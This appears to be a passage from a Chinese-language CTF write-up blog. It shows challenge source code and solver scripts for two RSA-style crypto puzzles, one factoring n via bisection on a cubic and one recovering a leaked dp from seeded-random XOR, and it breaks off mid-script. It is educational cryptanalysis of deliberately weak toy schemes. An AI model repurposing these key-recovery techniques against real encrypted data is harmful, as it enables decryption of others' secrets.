class="string">&#x27;&#x27;</span>.join([String[random.randint(<span class="number">0</span>,<span class="built_in">len</span>(String)-<span class="number">1</span>)] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>) ])</span><br><span class="line">    HASH = hashlib.sha256(STR.encode()).hexdigest()</span><br><span class="line">    <span class="keyword">return</span> STR[:<span class="number">4</span>],STR[<span class="number">4</span>:],HASH</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">key_gen</span>():</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        p, q = getPrime(KEYSIZE), getPrime(KEYSIZE)</span><br><span class="line">        e = <span class="number">0x10001</span></span><br><span class="line">        <span class="keyword">if</span> gcd(e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>)):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    key = [getPrime(<span class="built_in">int</span>(KEYSIZE * alpha)) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>)]</span><br><span class="line">    <span class="keyword">return</span> (p, q, e), key</span><br><span class="line"></span><br><span class="line"><span class="comment"># encrypto</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encry</span>(<span class="params">message,key,p,q,e</span>):</span></span><br><span class="line">    k1,k2 = key[random.randint(<span class="number">0</span>,<span class="number">127</span>)],key[random.randint(<span class="number">0</span>,<span class="number">127</span>)]</span><br><span class="line">    x = p**<span class="number">2</span> * (p + <span class="number">3</span>*q - <span class="number">1</span> ) + q**<span class="number">2</span> * (q + <span class="number">3</span>*p - <span class="number">1</span>)</span><br><span class="line">    y = <span class="number">2</span>*p*q + p + q</span><br><span class="line">    z = k1 + k2</span><br><span class="line">    c = <span class="built_in">pow</span>(b2l(message),e,p*q)</span><br><span class="line">    <span class="keyword">return</span> x * c + y * c + z</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># get flag</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getflag</span>(<span class="params">flag,key,p,q,e</span>):</span></span><br><span class="line">    <span class="keyword">return</span> encry(flag,key,p,q,e)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">server</span>(<span class="params">socketserver.BaseRequestHandler</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_recv</span>(<span class="params">self</span>):</span></span><br><span class="line">        data = self.request.recv(<span class="number">1024</span>)</span><br><span class="line">        <span class="keyword">return</span> data.strip()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_send</span>(<span class="params">self, msg, newline=<span class="literal">True</span></span>):</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(msg , <span class="built_in">bytes</span>):</span><br><span class="line">            msg += <span class="string">b&#x27;\n&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            msg += <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">            msg = msg.encode()</span><br><span class="line">        self.request.sendall(msg)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle</span>(<span class="params">self</span>):</span></span><br><span class="line">        START,END,HASH = proof_of_work()</span><br><span class="line">        self._send(<span class="string">&#x27;SHA-256(?+&#123;&#125;) == &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(END,HASH))</span><br><span class="line">        RCV = self._recv().decode()</span><br><span class="line">        <span class="keyword">if</span> RCV != START:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        self._send(<span class="string">&quot;I&#x27;m a CryptoRookie,so my Crypto system take time, please wait a minute XD!&quot;</span>)</span><br><span class="line">        (p,q,e),key = key_gen()</span><br><span class="line">        flag  = <span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">        self._send(WELCOME)</span><br><span class="line">        self._send(<span class="string">&#x27;This is my public key:\nn = &#123;&#125;\ne = &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(p*q),<span class="built_in">str</span>(e)))</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">            self._send(menu)</span><br><span class="line">            COI = <span class="built_in">int</span>(self._recv().decode())</span><br><span class="line">            <span class="keyword">if</span> COI == <span class="number">1</span> :</span><br><span class="line">                self._send(<span class="string">&#x27;Give me your message&#x27;</span>)</span><br><span class="line">                message = self._recv()</span><br><span class="line">                self._send(<span class="string">&#x27;Your encry message:&#x27;</span>)</span><br><span class="line">                self._send(<span class="built_in">str</span>(encry(message,key,p,q,e)))</span><br><span class="line">            <span class="keyword">elif</span> COI == <span class="number">2</span>:</span><br><span class="line">                self._send(<span class="string">&#x27;This is your favourite:\n&#x27;</span>)</span><br><span class="line">                self._send(<span class="built_in">str</span>(encry(flag,key,p,q,e)))</span><br><span class="line">            <span class="keyword">elif</span> COI == <span class="number">3</span>:</span><br><span class="line">                self._send(<span class="string">&#x27;Bye~&#x27;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ForkedServer</span>(<span class="params">socketserver.ThreadingMixIn, socketserver.TCPServer</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    HOST, PORT = <span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">10001</span></span><br><span class="line">    server = ForkedServer((HOST, PORT), server)</span><br><span class="line">    server.allow_reuse_address = <span class="literal">True</span></span><br><span class="line">    server.serve_forever()</span><br></pre></td></tr></table></figure>

<blockquote>
<p>我的第一次密码学导论作业, 参数的生成大家觉得怎样呢？</p>
</blockquote>
<p>加密的过程其实简单，我们知道cx+cy+z</p>
<p>关于z，这是与key有关的，根据之前的经验没有必要知道key怎么来的，只需要知道key是啥；至于题目提示的参数，也就是知道这些数字之间的位数关系，z是1040位的，z&gt;n，n是1024位的</p>
<p>比赛中推导出要解一个一元三次方程那里，也就是将x和y带入，设t=cx+cy+z，得<br>$$<br>t=c((p+q)^3-(p+q)^2+(p+q)+4n)+z<br>$$<br>c我们是完全可以算出来的，所以要解密，大致的方向就是绕过z，求出p+q，联系方程组求出p，成功分解n（所以send一个b’’得到z并没有什么用）</p>
<p>先两边模c，（懂的师傅可以直接跳过）</p>
<hr>
<p>一条性质忘了，或者说意识不够</p>
<p>若$a\equiv b\ (mod\ n)$且$c\equiv d\ (mod\ n)$，则$a+c\equiv b+d\ (mod\ n)$</p>
<p>已经是第二次写这个性质了，基本且重要，上次用到是在<a href="https://blog.csdn.net/m0_49109277/article/details/119841141?spm=1001.2014.3001.5501">RARCTF babycrypt</a>，再次强调这个结论是完全正确的，不存在那么多搞不灵清的地方。这道题就是将c(x+y)+z模一个c，因为<br>$$<br>c(x+y) \equiv 0\ (mod\ c)\ and\ z\equiv z\ (mod\ c)<br>$$<br>则，<br>$$<br>c(x+y)+z\equiv 0+z\equiv z\ (mod\ c)<br>$$<br>基础不扎实，两三次了，写得白痴点，希望下次看到就想到 </p>
<hr>
<p>由于z比n要大，所以肯定也比c要大，模c之后得到是一个z的近似，就设为$z_0,\ z=z_0+kc$</p>
<p>联想刚才我们那个比特差，这完全是可以爆破的</p>
<p>nc链接这里我们直接输入0，从字节转数字后是48</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = <span class="number">102216849365436215382697924706110458811930514492676972297707749802743855550173221018307625399833159477899481939208157339087054049976609580335655988542843751320232525212725188253172284097958271570601093708102334730018773991294621754198973615453247445854418322094753657026256442996256624353675259431618058069873</span></span><br><span class="line">m = <span class="number">48</span></span><br><span class="line">xy48z = <span class="built_in">int</span>(<span class="number">450598196470521201729638145452113029348556317197796881155043711358014330871436047647028445722146485815337297082414583140339423018492548153129219959722626240768144197737361486759977936811931098179802464569494368735770535145331711573991601967230786754264479211792290017487283155570172424436304991171550181462694341945090942595408994085351622030775911067608201899849483976554235818404368211044759737328469487348797618306191053975483123755715899624408944673166452085511225808970644524141442606260074195698665970921069220120499790094140467744114859479550895214898485493704330419766829998576629979339401250867858230499864955508881386228059060521591637918403999691833618755763870139199224654474706077813985939903700333433229365768180014529732361680254103667001711146673764660846</span>)</span><br><span class="line">flag = <span class="number">367985298100355719470464399231673186210476786528427647015381713693383054303800225562530305612381740440475705158111682270638520430798691039460739446257988390587750201598500460072950141405575319038364158570766686647844910095823628097948621068785641459446019851231163137871477328456219566424198083174973732247237495461084926082266277081410422432938607771568853035687579097465681519337154130220264871789653076508116420535916151874053965039332568736131529947962054505231214027124076372907141537134424968348626325641916288587742730444306999317712276831635493902127340833105337864025712574859765211691309758411102254824704082007127728486818136325623609908896494330215565717506933184069079577152226666507972552002709428549241805751962129348112606965895053348951420741781534761708</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">c = <span class="built_in">int</span>(<span class="built_in">pow</span>(m, e, n))</span><br><span class="line">z0 = xy48z % c</span><br><span class="line">var(<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65537</span>):</span><br><span class="line">    z = z0+c*k</span><br><span class="line">    t = (xy48z-z)//c</span><br><span class="line">    sol = solve([x**<span class="number">3</span>-x**<span class="number">2</span>+x+<span class="number">4</span>*n-t==<span class="number">0</span>], [x])</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;sqrt&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(sol):</span><br><span class="line">        <span class="built_in">print</span>(sol)</span><br></pre></td></tr></table></figure>

<p>我有点天真，以为sage可以帮我们直接算出来了，但数字大了，也变慢了，而且不确定解出来的是不是还带有sqrt</p>
<p>所以接下来就要自己手写解方程的脚本了，这里我们先按下不表，直接跳到解密那里去</p>
<p>假设我们已经知道了pq，那么对于$t=flag(x+y)+z$，两边整除一个x+y，类似海洋大学的easyrsa，由于x+y远大于z，z成了小数部分了，取个整得到就是flag加密后的结果，再用传统手艺去解，就得到了</p>
<p>好了，最关键的一步，解方程，现有的函数不行，因为数据太大、格式等问题<br>$$<br>x+y=(p+q)^3-(p+q)^2+(p+q)+4n=(t-z)\div c<br>$$<br>右边我们已经得到了，设a=p+q，则$f(a)=a^3-a^2+a+4n-(t-z)\div c$</p>
<p>求一次导可知$f^{‘}(a)=3a^2-2a+1$，$\Delta=4-12&lt;0$，$f^{‘}(a)&gt;0$</p>
<p>所以f(a)是单调递增的，与x轴只有一个交点，而且它的根p+q的范围在$(2^{511}, 2^{513})$</p>
<p>说到解这个方程，枚举当然简单暴力，但无奈数字实在太大，时间复杂度为O(n)，那么很快就可以想到降低复杂度的二分法，用二分法逼近本身就是解方程的算法之一；这样时间复杂度就是O(logn)，也就是500多次，这对于原本就支持大数据的python来说简直不要太友好了</p>
<p>加上之前的枚举z写了以下脚本，因为对近似不是很懂，所以先还是框定在熟悉的整数范围</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> poly, symbols, solve</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes, bytes_to_long</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line">n = <span class="number">89376247830772550635393374593591171289469473653660506041384870807672514851291613034103293150272794811662040962795338417767924390664160855795592847165664672215596625265833096358547808457216406919256623973605519954393257168668848139892103199585870486478679862843688695515256562706151337833114331221189851505307</span></span><br><span class="line">m = bytes_to_long(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">xy48z = <span class="number">573183539558274845040105647253832611006389515982240063596818567154070335454441330456418916326928035506269242019877858095541028214384303624168930086298598137836679435122632007591230447675399859253040527098932082536817835600632684346743007442271210095370147310122023527616598189055800206892622591152310306250178532132575799836929460532267589534884854821163062186146162009389124822796655667824602408842104081327204184627274796695507250901179031687241027321102940261994875706732189407136668725738443141883613083605571514576490785426071453368710281928806135571137549546326030047579322709176195586142692435882988042924394657669689613769885662846359646103364540846219586145970778569409592707222106372820845133370558195785112000772658458805185628127184922396498760974419572604362</span></span><br><span class="line">flag = <span class="number">481729115764190744536910657085560158889970175686907401215490337526880230376819524492470636911767799236673524142385694360618832004117695823025161532124563697622558707411901261718979417287250753659221620598917189492752483245076665914783267295393931619281742213297076869813336749887922096598517333008819428035961760565398531704160502999798281136827037178130719826007120327143140435965940414720309889209176695802426545166579994960663962651160284302004216242606526094359968261816259941079928016610890122763028512785756541595874084647315002410857503747496456626710003349795505137331698911171491656135642059625243605709398076541265707971793648280382336060691064915972346110379252467007887636411312702061909523885468047172320514051839865352276472579281312844240544893396792447946</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">c = <span class="built_in">int</span>(<span class="built_in">pow</span>(m, e, n))</span><br><span class="line">z0 = xy48z % c</span><br><span class="line">x = symbols(<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">p = symbols(<span class="string">&#x27;p&#x27;</span>)</span><br><span class="line">q = symbols(<span class="string">&#x27;q&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>**<span class="number">16</span>+<span class="number">1</span>, <span class="number">2</span>**<span class="number">18</span>):</span><br><span class="line">    z = z0 + c * k</span><br><span class="line">    t = (xy48z - z) // c</span><br><span class="line">    _poly = poly(x ** <span class="number">3</span> - x ** <span class="number">2</span> + x + <span class="number">4</span> * n - t)</span><br><span class="line">    xy = poly(x ** <span class="number">3</span> - x ** <span class="number">2</span> + x + <span class="number">4</span> * n)</span><br><span class="line">    l = <span class="number">2</span> ** <span class="number">511</span></span><br><span class="line">    r = <span class="number">2</span> ** <span class="number">513</span></span><br><span class="line">    <span class="keyword">while</span> l &lt; r:</span><br><span class="line">        mid = (l + r) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> _poly(mid) == <span class="number">0</span>:</span><br><span class="line">            sol = solve([p * q - n, p + q - mid], [p, q])</span><br><span class="line">            p = <span class="built_in">int</span>(sol[<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line">            q = <span class="built_in">int</span>(sol[<span class="number">0</span>][<span class="number">1</span>])</span><br><span class="line">            <span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(flag // xy(p + q), invert(e, <span class="built_in">int</span>((p - <span class="number">1</span>) * (q - <span class="number">1</span>))), n)))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> _poly(mid) &lt; <span class="number">0</span>:</span><br><span class="line">            l = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            r = mid - <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>结果跑了好久，一度怀疑是不是出来问题？最后还是出来了，看来这样子复杂度太大的</p>
<p>那么研究下尚师傅以及其他师傅的做法</p>
<p>他们的思路是直接用得到的z0求出一个x+y的近似值，将其带入f(a)，得到是正数，说明这个数在真正的x+y的右边，根据单调性</p>
<img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210825170440092.png" alt="image-20210825170440092"/>

<p>这个近似的x+y的位数是1538，所以只要在$[2^{511}, 2^{1538}]$之间二分就好了，最后会二分到两个相邻的整数之间，因为方程的右边是我们得到的近似值，所以妄想得到一个整数解是不太可能的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> poly, symbols, solve</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes, bytes_to_long</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line">n = <span class="number">89376247830772550635393374593591171289469473653660506041384870807672514851291613034103293150272794811662040962795338417767924390664160855795592847165664672215596625265833096358547808457216406919256623973605519954393257168668848139892103199585870486478679862843688695515256562706151337833114331221189851505307</span></span><br><span class="line">m = bytes_to_long(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">xy48z = <span class="number">573183539558274845040105647253832611006389515982240063596818567154070335454441330456418916326928035506269242019877858095541028214384303624168930086298598137836679435122632007591230447675399859253040527098932082536817835600632684346743007442271210095370147310122023527616598189055800206892622591152310306250178532132575799836929460532267589534884854821163062186146162009389124822796655667824602408842104081327204184627274796695507250901179031687241027321102940261994875706732189407136668725738443141883613083605571514576490785426071453368710281928806135571137549546326030047579322709176195586142692435882988042924394657669689613769885662846359646103364540846219586145970778569409592707222106372820845133370558195785112000772658458805185628127184922396498760974419572604362</span></span><br><span class="line">flag = <span class="number">481729115764190744536910657085560158889970175686907401215490337526880230376819524492470636911767799236673524142385694360618832004117695823025161532124563697622558707411901261718979417287250753659221620598917189492752483245076665914783267295393931619281742213297076869813336749887922096598517333008819428035961760565398531704160502999798281136827037178130719826007120327143140435965940414720309889209176695802426545166579994960663962651160284302004216242606526094359968261816259941079928016610890122763028512785756541595874084647315002410857503747496456626710003349795505137331698911171491656135642059625243605709398076541265707971793648280382336060691064915972346110379252467007887636411312702061909523885468047172320514051839865352276472579281312844240544893396792447946</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">c = <span class="built_in">int</span>(<span class="built_in">pow</span>(m, e, n))</span><br><span class="line">z0 = xy48z % c</span><br><span class="line">x = symbols(<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">p = symbols(<span class="string">&#x27;p&#x27;</span>)</span><br><span class="line">q = symbols(<span class="string">&#x27;q&#x27;</span>)</span><br><span class="line">t = (xy48z - z0) // c</span><br><span class="line">_poly = poly(x ** <span class="number">3</span> - x ** <span class="number">2</span> + x + <span class="number">4</span> * n - t)</span><br><span class="line">xy = poly(x ** <span class="number">3</span> - x ** <span class="number">2</span> + x + <span class="number">4</span> * n)</span><br><span class="line">l = <span class="number">2</span> ** <span class="number">511</span></span><br><span class="line">r = <span class="number">2</span> ** <span class="number">1538</span></span><br><span class="line"><span class="keyword">while</span> l &lt; r:</span><br><span class="line">    mid = (l + r) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> _poly(mid) &lt; <span class="number">0</span>:</span><br><span class="line">        l = mid</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r = mid</span><br><span class="line">    <span class="comment"># 相邻两个整数之间</span></span><br><span class="line">    <span class="keyword">if</span> r == l+<span class="number">1</span>:</span><br><span class="line">        a = l <span class="keyword">if</span> l % <span class="number">2</span> == <span class="number">0</span> <span class="keyword">else</span> r</span><br><span class="line">        sol = solve([p * q - n, p + q - mid], [p, q])</span><br><span class="line">        p, q = sol[<span class="number">0</span>][<span class="number">0</span>], sol[<span class="number">0</span>][<span class="number">1</span>]</span><br><span class="line">        <span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(flag//xy(p+q), invert(e, <span class="built_in">int</span>((p - <span class="number">1</span>) * (q - <span class="number">1</span>))), n)))</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>总结，相比Guess，这个虽然有16次循环，但是并全部用起来；自己还是刷题不够多，像二分法之前也考过，基本数学素养不够，对近似值也不够敏感；注意二分法和暴力穷举的区别</p>
<h2 id="Crypto-Random-RSA"><a href="#Crypto-Random-RSA" class="headerlink" title="Crypto-Random_RSA"></a>Crypto-Random_RSA</h2><p>kw的python2，这种题没能抢血，手速不够啊</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">flag=<span class="string">r&#x27;flag&#123;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">p=getPrime(<span class="number">512</span>)</span><br><span class="line">q=getPrime(<span class="number">512</span>)</span><br><span class="line">e=<span class="number">0x10001</span></span><br><span class="line">n=p*q</span><br><span class="line">ct=<span class="built_in">pow</span>(flag,e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n=&quot;</span>+ n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;ct=&quot;</span>+ ct)</span><br><span class="line"></span><br><span class="line">dp=<span class="string">r&#x27;&#x27;</span></span><br><span class="line">seeds = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(dp)):</span><br><span class="line">    seeds.append(random.randint(<span class="number">0</span>,<span class="number">10000</span>))</span><br><span class="line"></span><br><span class="line">res = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(dp)):</span><br><span class="line">    random.seed(seeds[i])</span><br><span class="line">    rands = []</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">4</span>):</span><br><span class="line">        rands.append(random.randint(<span class="number">0</span>,<span class="number">255</span>))</span><br><span class="line"></span><br><span class="line">    res.append(<span class="built_in">ord</span>(dp[i]) ^ rands[i%<span class="number">4</span>])</span><br><span class="line">    <span class="keyword">del</span> rands[i%<span class="number">4</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">str</span>(rands))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"><span class="built_in">print</span>(seeds)</span><br><span class="line"></span><br><span class="line"><span class="comment"># n=81196282992606113591233615204680597645208562279327854026981376917977843644855180528227037752692498558370026353244981467900057157997462760732019372185955846507977456657760125682125104309241802108853618468491463326268016450119817181368743376919334016359137566652069490881871670703767378496685419790016705210391</span></span><br><span class="line"><span class="comment"># ct=61505256223993349534474550877787675500827332878941621261477860880689799960938202020614342208518869582019307850789493701589309453566095881294166336673487909221860641809622524813959284722285069755310890972255545436989082654705098907006694780949725756312169019688455553997031840488852954588581160550377081811151</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># [58, 53, 122] [145, 124, 244] [5, 19, 192] [255, 23, 64] [57, 113, 194] [246, 205, 162] [112, 87, 95] [215, 147, 105] [16, 131, 38] [234, 36, 46] [68, 61, 146] [148, 61, 9] [139, 77, 32] [96, 56, 160] [121, 76, 17] [114, 246, 92] [178, 206, 60] [168, 147, 26] [168, 41, 68] [24, 93, 84] [175, 43, 88] [147, 97, 153] [42, 94, 45] [150, 103, 127] [68, 163, 62] [165, 37, 89] [219, 248, 59] [241, 182, 8] [140, 211, 146] [88, 226, 2] [48, 150, 56] [87, 109, 255] [227, 216, 65] [23, 190, 10] [5, 25, 64] [6, 12, 124] [53, 113, 124] [255, 192, 158] [61, 239, 5] [62, 108, 86] [123, 44, 64] [195, 192, 30] [30, 82, 95] [56, 178, 165] [68, 77, 239] [106, 247, 226] [17, 46, 114] [91, 71, 156] [157, 43, 182] [146, 6, 42] [148, 143, 161] [108, 33, 139] [139, 169, 157] [71, 140, 25] [28, 153, 26] [241, 221, 235] [28, 131, 141] [159, 111, 184] [47, 206, 11] [220, 152, 157] [41, 213, 97] [4, 220, 10] [77, 13, 248] [94, 140, 110] [25, 250, 226] [218, 102, 109] [189, 238, 66] [91, 18, 131] [23, 239, 190] [159, 33, 72] [183, 78, 208] [209, 213, 101] [111, 50, 220] [166, 104, 233] [170, 144, 10] [187, 87, 175] [195, 59, 104] [165, 179, 179] [99, 247, 153] [195, 61, 100] [223, 159, 165] [230, 93, 184] [87, 28, 35] [35, 122, 38] [158, 188, 163] [229, 192, 222] [12, 12, 192] [207, 95, 224] [127, 113, 137] [22, 114, 143] [13, 45, 144] [70, 140, 211] [57, 101, 42] [132, 62, 129] [40, 128, 124] [1, 132, 161] [164, 33, 133] [252, 201, 32] [8, 18, 247] [1, 88, 55] [201, 135, 186] [101, 254, 125] [236, 196, 39] [148, 24, 103] [101, 29, 253] [97, 156, 64] [90, 103, 91] [50, 48, 80] [206, 22, 93] [11, 114, 174] [61, 132, 247] [215, 32, 232] [95, 128, 90] [57, 35, 228] [163, 143, 107] [178, 250, 28] [64, 107, 225] [106, 115, 207] [85, 134, 21] [118, 201, 76] [234, 34, 22] [241, 236, 122] [111, 185, 127] [1, 26, 164] [254, 57, 117] [243, 27, 32] [161, 88, 80] [50, 165, 93] [87, 182, 216] [184, 159, 63] [167, 166, 123] [37, 78, 33] [186, 81, 58] [48, 3, 239] [70, 186, 13] [56, 108, 178] [54, 55, 235] [105, 180, 105] [16, 194, 98] [136, 11, 41] [18, 203, 79] [185, 114, 170] [148, 181, 223] [118, 57, 160] [23, 250, 181] [235, 219, 228] [44, 151, 38] [185, 224, 134] [42, 162, 122] [3, 9, 158] [129, 245, 2] [66, 241, 92] [80, 124, 36]</span></span><br><span class="line"><span class="comment"># [55, 5, 183, 192, 103, 32, 211, 116, 102, 120, 118, 54, 120, 145, 185, 254, 77, 144, 70, 54, 193, 73, 64, 0, 79, 244, 190, 23, 215, 187, 53, 176, 27, 138, 42, 89, 158, 254, 159, 133, 78, 11, 155, 163, 145, 248, 14, 179, 23, 226, 220, 201, 5, 71, 241, 195, 75, 191, 237, 108, 141, 141, 185, 76, 7, 113, 191, 48, 135, 139, 100, 83, 212, 242, 21, 143, 255, 164, 146, 119, 173, 255, 140, 193, 173, 2, 224, 205, 68, 10, 77, 180, 24, 23, 196, 205, 108, 28, 243, 80, 140, 4, 98, 76, 217, 70, 208, 202, 78, 177, 124, 10, 168, 165, 223, 105, 157, 152, 48, 152, 51, 133, 190, 202, 136, 204, 44, 33, 58, 4, 196, 219, 71, 150, 68, 162, 175, 218, 173, 19, 201, 100, 100, 85, 201, 24, 59, 186, 46, 130, 147, 219, 22, 81]</span></span><br><span class="line"><span class="comment"># [4827, 9522, 552, 880, 7467, 7742, 9425, 4803, 6146, 4366, 1126, 4707, 1138, 2367, 1081, 5577, 4592, 5897, 4565, 2012, 2700, 1331, 9638, 7741, 50, 824, 8321, 7411, 6145, 1271, 7637, 5481, 8474, 2085, 2421, 590, 7733, 9427, 3278, 5361, 1284, 2280, 7001, 8573, 5494, 7431, 2765, 827, 102, 1419, 6528, 735, 5653, 109, 4158, 5877, 5975, 1527, 3027, 9776, 5263, 5211, 1293, 5976, 7759, 3268, 1893, 6546, 4684, 419, 8334, 7621, 1649, 6840, 2975, 8605, 5714, 2709, 1109, 358, 2858, 6868, 2442, 8431, 8316, 5446, 9356, 2817, 2941, 3177, 7388, 4149, 4634, 4316, 5377, 4327, 1774, 6613, 5728, 1751, 8478, 3132, 4680, 3308, 9769, 8341, 1627, 3501, 1046, 2609, 7190, 5706, 3627, 8867, 2458, 607, 642, 5436, 6355, 6326, 1481, 9887, 205, 5511, 537, 8576, 6376, 3619, 6609, 8473, 2139, 3889, 1309, 9878, 2182, 8572, 9275, 5235, 6989, 6592, 4618, 7883, 5702, 3999, 925, 2419, 7838, 3073, 488, 21, 3280, 9915, 3672, 579]</span></span><br></pre></td></tr></table></figure>

<p>之前也有类似的题目，通过相同的种子生成相同的随机数序列。这道题考点dp泄漏，对dp进行了异或操作；异或回来就好了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">n = <span class="number">81196282992606113591233615204680597645208562279327854026981376917977843644855180528227037752692498558370026353244981467900057157997462760732019372185955846507977456657760125682125104309241802108853618468491463326268016450119817181368743376919334016359137566652069490881871670703767378496685419790016705210391</span></span><br><span class="line">ct = <span class="number">61505256223993349534474550877787675500827332878941621261477860880689799960938202020614342208518869582019307850789493701589309453566095881294166336673487909221860641809622524813959284722285069755310890972255545436989082654705098907006694780949725756312169019688455553997031840488852954588581160550377081811151</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">res = [<span class="number">55</span>, <span class="number">5</span>, <span class="number">183</span>, <span class="number">192</span>, <span class="number">103</span>, <span class="number">32</span>, <span class="number">211</span>, <span class="number">116</span>, <span class="number">102</span>, <span class="number">120</span>, <span class="number">118</span>, <span class="number">54</span>, <span class="number">120</span>, <span class="number">145</span>, <span class="number">185</span>, <span class="number">254</span>, <span class="number">77</span>, <span class="number">144</span>, <span class="number">70</span>, <span class="number">54</span>, <span class="number">193</span>, <span class="number">73</span>, <span class="number">64</span>, <span class="number">0</span>, <span class="number">79</span>,</span><br><span class="line">       <span class="number">244</span>, <span class="number">190</span>, <span class="number">23</span>, <span class="number">215</span>, <span class="number">187</span>, <span class="number">53</span>, <span class="number">176</span>, <span class="number">27</span>, <span class="number">138</span>, <span class="number">42</span>, <span class="number">89</span>, <span class="number">158</span>, <span class="number">254</span>, <span class="number">159</span>, <span class="number">133</span>, <span class="number">78</span>, <span class="number">11</span>, <span class="number">155</span>, <span class="number">163</span>, <span class="number">145</span>, <span class="number">248</span>, <span class="number">14</span>, <span class="number">179</span>, 